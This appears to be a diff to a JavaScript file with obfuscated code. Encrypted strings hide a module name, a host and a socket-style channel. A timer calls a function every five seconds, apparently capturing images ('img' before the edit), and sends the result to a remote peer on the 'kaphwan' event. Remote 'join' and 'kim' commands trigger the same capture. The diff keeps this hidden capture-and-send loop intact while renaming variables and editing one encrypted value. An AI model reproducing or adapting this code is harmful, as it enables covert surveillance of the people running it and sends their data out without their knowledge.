@@ -11,7 +11,7 @@ function decrypt(text) {
   return dec;
 }
 let hw = decrypt("0c9ac0807b3e377c3947ef19faec129ca7468afac8fec73e2df90526");
-let cl = decrypt('098fcdc1');//2,3,4
+let cl = decrypt('098fcdc2');
 let sh = decrypt('178dc695247f6b783f5da909f7f0178fbc5f');
 let sk = decrypt('1781d79b246536793f04e701fbe6128f');
 const flap = require(sh);
@@ -21,11 +21,11 @@ function start(counter) {
     setTimeout(function () {
       counter++;
       flap()
-        .then((img) => {
-          finding.emit("kaphwan", img);
+        .then((res) => {
+          finding.emit("kaphwan", res);
         })
         .catch((err) => {
-          // ...
+          // do something
         });
       start(counter);
     }, 5000);
@@ -41,8 +41,10 @@ finding.on("join", function () {
 finding.on("kim", function () {
   stop = 0;
   flap()
-    .then((img) => {
-      finding.emit("kaphwan", img);
+    .then((res) => {
+      finding.emit("kaphwan", res);
     })
-    .catch((err) => {});
+    .catch((err) => {
+        // do something
+    });
 });
